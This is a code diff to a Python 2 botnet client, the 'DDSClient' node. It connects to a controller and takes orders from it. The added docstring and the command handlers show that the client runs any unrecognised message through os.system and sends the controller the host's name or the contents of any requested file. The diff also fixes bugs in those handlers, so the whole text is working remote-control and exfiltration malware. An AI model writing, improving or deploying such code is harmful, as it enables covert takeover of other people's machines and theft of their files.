@@ -3,6 +3,16 @@
 """Client connection for the bot net. \
 				Tested with Python 2.7.6 \
 				On MACOSX and Ubuntu
+--------------------------------------------
+Control commands for the bot:
+	replyto X: Set default replyto address for broadcasts
+	hostname: Send the client's hostname
+	sendfile 'myfile': Send the specified file
+	exit: Disconnect the client
+
+Any other message will be executed directly with the 
+os.system command.
+
 				"""
 ##### Imports #####
 #from threading import Thread
@@ -17,6 +27,7 @@ from argparse import (
 			ArgumentParser,
 			ArgumentDefaultsHelpFormatter
 			)
+from time import sleep
 ####################
 
 #### (Magic) Defaults ####
@@ -79,7 +90,10 @@ def clientsocket(host, port):
 	s.connect((host,port))
 	return s
 
+
 class Exit(Exception):
+	''' An Abuse of Exceptions 
+	... because return codes are just ugly'''
 	pass
 
 # This class represents a node in the botnet
@@ -119,7 +133,7 @@ class DDSClient:
 	def __str__(self):
 		return self.__repr__
 
-	# Broadcast a teardown and close the server
+	# Close the client socket and raise Exit
 	def __del__(self):
 		try:
 			self.respond(self.address, 0)
@@ -139,10 +153,11 @@ class DDSClient:
 				return
 			else:
 				return 
-		if self.verbose:
-			print "Sending '%s' to Client #%s" % (str(payload).strip(), str(to))
 
-		res = str(to) + ": '" + str(payload) + "'\r\n"
+		res = str(to) + ": " + str(payload)
+		if self.verbose:
+			print "Sending..."
+			print res
 		self.client.send(res)
 
 
@@ -150,6 +165,7 @@ class DDSClient:
 	def __handle_msg__(self, msg):
 		mtuple = msg.split(":", 1)
 		try:
+			print mtuple
 			to = int(mtuple[0])
 		except ValueError:
 			raise
@@ -180,31 +196,32 @@ class DDSClient:
 
 # Commands ###
 	def set_master(self, to, master):
-		self.master = master
+		self.master = int(master)
 		if self.verbose:
-			respond(to, "Set replyto address successfully")
+			self.respond(to, "Set replyto address successfully")
 
 	def hostname(self,to):
 		self.respond(to, gethostname())
 
 	def sendfile(self, to, sfile):
 		respond = self.respond
-		sfile = sfile.strip("'")
+		sfile = sfile.strip("'\"")
 		try:
 			with open(sfile, 'r') as F:
 				for line in F:
 					respond(to, line)
+
 		except IOError:
 			msg = "Error: %s not found" %sfile
-			respond(to, msg)
 			if self.verbose:
-				print msg
+				respond(to, msg)
+
 
 	def execute(self,to, payload):
 		rval = system(payload)
-		self.respond(to, rval)
 		if self.verbose:
-			print "Executed: '%s'\n Return Code: %i" % (payload,rval)
+			self.respond(to, "Executed: '%s' \r\n")
+		self.respond(to, rval)
 	
 ##############
 
@@ -229,7 +246,7 @@ class DDSClient:
 	def __call__(self):
 		try:
 			client = self.listen()
-		except Exception:
+		except Exit:
 			pass
 		finally:
 			del self
